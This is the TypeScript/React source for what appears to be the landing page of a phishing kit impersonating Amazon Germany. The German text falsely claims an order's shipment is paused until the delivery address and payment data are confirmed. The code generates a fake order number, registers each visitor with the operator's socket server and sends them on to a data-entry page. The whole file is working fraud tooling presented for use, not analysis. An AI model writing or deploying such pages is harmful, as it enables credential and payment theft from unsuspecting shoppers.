import { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socket } from '../socket';
import { getClientId, setActivated } from '../session';
import { BRAND, BRAND_PROMISES } from '../brand';

function buildOrderNumber(clientId: string) {
  const seed = (clientId || 'amazon-order-seed').replace(/[^a-zA-Z0-9]/g, '');
  let hash = 0;
  for (let i = 0; i < seed.length; i += 1) {
    hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
  }

  const segment = (length: number, salt: number) => {
    let value = (hash ^ salt) >>> 0;
    let out = '';
    while (out.length < length) {
      value = (value * 1664525 + 1013904223) >>> 0;
      out += String(value % 10);
    }
    return out.slice(0, length);
  };

  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
}

export default function Home() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const orderNumber = useMemo(() => buildOrderNumber(getClientId()), []);
  const orderPlacedDate = new Intl.DateTimeFormat('de-DE', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
  }).format(new Date());

  useEffect(() => {
    const clientId = getClientId();
    let started = false;

    const attachHomeSession = () => {
      if (started) return;
      started = true;
      socket.emit('attach-client', { clientId }, () => {
        socket.emit('join-page', 'home');
      });
    };

    if (!socket.connected) {
      socket.connect();
      socket.once('connect', attachHomeSession);
      window.setTimeout(attachHomeSession, 900);
    } else {
      attachHomeSession();
    }

    return () => {
      socket.off('connect', attachHomeSession);
    };
  }, []);

  const handleContinue = () => {
    if (loading) return;
    setLoading(true);

    try {
      const clientId = getClientId();
      setActivated(true);

      const registerTime = new Date().toLocaleString('de-DE', {
        timeZone: 'Asia/Shanghai',
        hour12: false,
      });

      let started = false;
      const start = () => {
        if (started) return;
        started = true;

        socket.emit('attach-client', { clientId }, () => {
          socket.emit('join-page', 'home');
          socket.emit('register-user', { clickTime: registerTime, clientId }, () => {
            setLoading(false);
            navigate('/info');
          });
        });
      };

      if (!socket.connected) {
        socket.connect();
        socket.once('connect', start);
        window.setTimeout(start, 900);
        return;
      }

      start();
    } catch {
      setLoading(false);
    }
  };

  return (
    <div className="alz-page">
      <div className="alz-shell">
        <div className="alz-home-grid alz-home-order-layout">
          <div className="alz-card alz-home-main-card">
            <div className="alz-home-kicker">Bestelluebersicht</div>
            <div className="alz-order-header">
              <div>
                <h2 className="alz-page-title">Der Versand bleibt pausiert, bis Ihre Lieferadresse bestaetigt wurde</h2>
                <p className="alz-page-copy">
                  Die hinterlegte Lieferadresse fuer diese Bestellung konnte nicht abschliessend bestaetigt werden.
                  Bitte pruefen Sie die Lieferdaten unten, damit die Zustellung fortgesetzt werden kann.
                </p>
              </div>
              <div className="alz-order-id">
                <span>Bestellnummer</span>
                <strong>{orderNumber}</strong>
              </div>
            </div>

            <div className="alz-home-mobile-strip">
              <span>Bestellnummer {orderNumber}</span>
              <strong>Pausiert</strong>
            </div>

            <div className="alz-order-product">
              <div className="alz-order-product-thumb" />
              <div className="alz-order-product-copy">
                <div className="alz-order-product-title">Fuer diese Bestellung ist eine Lieferbestaetigung erforderlich</div>
                <div className="alz-order-product-meta">Ein Artikel kann erst zugestellt werden, nachdem Ihre Lieferdaten bestaetigt wurden.</div>
                <div className="alz-order-product-meta">Bestelldatum {orderPlacedDate}</div>
              </div>
              <div className="alz-order-product-price">Pausiert</div>
            </div>

            <div className="alz-order-panel-grid">
              <section className="alz-order-panel">
                <div className="alz-order-panel-title">Warum eine Pruefung noetig ist</div>
                <div className="alz-order-panel-copy">Bei den gespeicherten Lieferdaten wurde eine Abweichung erkannt. Nach der Bestaetigung wird der Versand automatisch fortgesetzt.</div>
                <div className="alz-order-panel-meta">
                  <span>Diese Lieferung ist aktuell pausiert</span>
                  <strong>Nach der Pruefung wird der Versand fortgesetzt</strong>
                </div>
              </section>
            </div>

            <div className="alz-brand-row">
              {BRAND_PROMISES.map((item) => (
                <span key={item} className="alz-brand-pill">{item}</span>
              ))}
            </div>

            <div className="alz-order-action">
              <div className="alz-order-action-alert">Bitte bestaetigen Sie diese Bestellung jetzt, um weitere Lieferverzoegerungen zu vermeiden.</div>
              <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
                {loading ? 'Wird geladen...' : 'Lieferdaten bestaetigen'}
              </button>
              <p className="alz-helper-copy">Der Vorgang dauert normalerweise weniger als 2 Minuten.</p>
            </div>

            <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
          </div>

          <aside className="alz-card alz-home-aside-card alz-side-summary">
            <div className="alz-side-summary-title">Versandstatus</div>
            <div className="alz-order-mini-card">
              <div className="alz-order-mini-thumb" />
              <div>
                <div className="alz-order-mini-title">Lieferbestaetigung erforderlich</div>
                <div className="alz-order-mini-copy">Fuer einen Artikel dieser Bestellung werden aktuelle Lieferdaten benoetigt.</div>
              </div>
            </div>
            <div className="alz-side-summary-list">
              <div>Lieferadresse bestaetigen</div>
              <div>Zahlungsdaten pruefen</div>
              <div>Versand danach fortsetzen</div>
            </div>
            <div className="alz-side-summary-box">Nach der Bestaetigung der erforderlichen Angaben wird der Versand wieder aufgenommen.</div>
            <div className="alz-side-summary-help">Wenn Sie Hilfe benoetigen, wenden Sie sich an den Kundenservice.</div>
          </aside>
        </div>
      </div>
    </div>
  );
}
